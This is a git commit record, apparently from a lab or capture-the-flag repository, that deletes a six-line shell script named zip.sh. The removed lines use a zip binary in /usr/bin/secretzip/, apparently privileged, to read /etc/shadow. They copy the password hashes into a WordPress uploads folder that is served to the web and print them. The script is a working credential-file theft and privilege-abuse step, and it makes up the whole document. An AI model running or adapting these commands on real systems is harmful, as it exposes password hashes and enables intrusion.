5811fe97e9b37192aef0055a89ed50a94dbd62d5
Actariss <104220453+Actariss@users.noreply.github.com>
2024-06-05 21:03:02 +0200

    Delete zip.sh

--- zip.sh
+++
@@ -1,6 +0,0 @@
-cd /usr/bin/secretzip/  
-LFILE=/etc/shadow
-TF=/srv/www/wordpress/wp-content/uploads/wpr-addons/forms/shadow.zip
-./zip $TF $LFILE
-unzip -p $TF > /srv/www/wordpress/wp-content/uploads/wpr-addons/forms/shadow
-cat /srv/www/wordpress/wp-content/uploads/wpr-addons/forms/shadow
